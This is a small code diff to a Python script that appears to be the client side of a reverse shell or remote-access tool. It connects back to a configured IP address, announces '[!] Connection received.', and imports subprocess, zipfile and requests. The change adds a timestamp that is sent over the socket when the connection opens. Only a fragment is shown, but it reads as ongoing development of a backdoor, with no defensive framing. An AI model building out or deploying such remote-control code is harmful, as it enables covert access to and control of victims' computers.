@@ -1,3 +1,4 @@
+from datetime import datetime
 import socket
 import time
 import subprocess
@@ -5,6 +6,10 @@ import os
 import zipfile
 import requests
 import platform
+
+timestamp = time.time()
+TIME = datetime.fromtimestamp(timestamp)
+data_day = TIME.ctime()
 
 
 ip = '127.0.0.1' 
@@ -16,6 +21,7 @@ def connection(ip, port):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
+            send_data(s, data_day)
             s.send(b"\n[!] Connection received.\n")
             return s
         except socket.error as e:
